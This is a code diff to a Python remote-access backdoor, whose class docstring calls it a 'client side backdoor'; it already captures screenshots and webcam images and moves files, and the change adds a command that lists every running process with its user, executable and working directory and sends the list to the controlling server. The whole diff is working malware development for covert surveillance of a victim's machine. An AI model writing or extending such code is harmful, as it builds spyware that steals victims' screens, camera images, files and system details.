@@ -9,6 +9,7 @@ from getpass import getuser
 from datetime import datetime
 from pyscreenshot import grab
 from cv2 import VideoCapture, imencode
+from psutil import process_iter, AccessDenied, ZombieProcess
 from pathlib import Path
 from json import loads as jloads
 from pickle import loads, dumps
@@ -25,7 +26,7 @@ class Client(object):
     """ client side backdoor """
     def __init__(self, host='0.0.0.0', port=5000):
         self.__Address = (host, port)
-        self.webcamshotPath, self.screenshotPath = '/home/znairy/37962716e6f637.png','/home/znairy/736f6e61726973.png'
+        self.screenshotPath = '/tmp/736f6e61726973.png' if uname().sysname.lower() == 'linux' else f'C:/Users/{getuser()}/AppData/Local/Temp/736f6e61726973.png'
 
     def __repr__(self):
         print(f'Server(host="{self.__Address[0]}", port={self.__Address[1]})')
@@ -33,6 +34,21 @@ class Client(object):
     # removing the screenshot file
     def removeScreenshot(self):
         Path(self.screenshotPath).unlink(missing_ok=True)
+
+    # getting info of all processes running in the moment
+    def getProcessList(self, args):
+        data = []
+        for process in process_iter():
+            try:
+                data.append({"pid": str(process.pid), "user": process.username(), "name": process.name(), "exe": process.exe(), "cwd": process.cwd()})
+            except AccessDenied:
+                data.append({"pid": str(process.pid), "user": process.username(), "name": process.name(), "exe": "", "cwd": ""})
+            except ZombieProcess:
+                data.append({"pid": str(process.pid), "user": process.username(), "name": process.name(), "exe": "", "cwd": ""})
+        
+        self.sendHeader({"total": len(data), "bytes": len(dumps(data))})
+        sleep(0.5)
+        self.__Client.send(dumps(data))
 
     # receiving a file from server side (upload)
     def upload(self, args):
@@ -164,6 +180,7 @@ class Client(object):
             "/download": {"action": self.download},
             "/upload": {"action": self.upload},
             "/webcamshot": {"action": self.webcamshot},
+            "/getprocesslist": {"action": self.getProcessList},
             "cd": {"action": self.changeDirectory}
         }
 
